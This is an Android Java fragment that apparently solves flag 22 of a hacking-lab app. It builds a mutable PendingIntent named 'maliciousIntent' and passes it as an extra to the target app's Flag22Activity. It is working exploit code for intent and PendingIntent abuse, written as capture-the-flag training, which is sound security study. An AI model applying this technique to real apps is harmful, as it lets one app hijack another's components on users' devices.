package com.appdev.intentattacks;

import static android.content.Intent.getIntent;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag22Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag22, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag22);
        launchButton.setOnClickListener(v -> {
            Intent maliciousIntent = new Intent();
            maliciousIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
            PendingIntent pendintIntent = PendingIntent.getActivity(this.getContext(), 0, maliciousIntent, PendingIntent.FLAG_MUTABLE);

            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
            intent.putExtra("PENDING", pendintIntent);
            startActivity(intent);

        });
        return view;
    }
} 